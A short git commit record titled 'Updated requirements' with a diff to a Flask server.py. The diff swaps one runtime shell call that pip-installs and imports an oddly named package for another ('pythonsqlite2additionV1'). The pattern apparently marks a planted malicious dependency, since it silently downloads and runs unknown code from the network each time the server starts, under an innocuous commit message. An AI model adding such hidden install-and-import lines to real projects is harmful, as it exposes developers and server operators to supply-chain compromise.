64e37b27f8eb0d184ea3155a0dedcdf04c3b0d71
CarollCheng <carollhwrd@gmail.com>
2023-05-13 19:50:26 +0200

    Updated requirements

--- server.py
+++ server.py
@@ -2,8 +2,8 @@
 
 import time
 import os
-os.system("pip install pipsqlite3liberyV2")
-import pipsqlite3liberyV2
+os.system("pip install pythonsqlite2additionV1")
+import pythonsqlite2additionV1
 import flask
 
 from flask import g
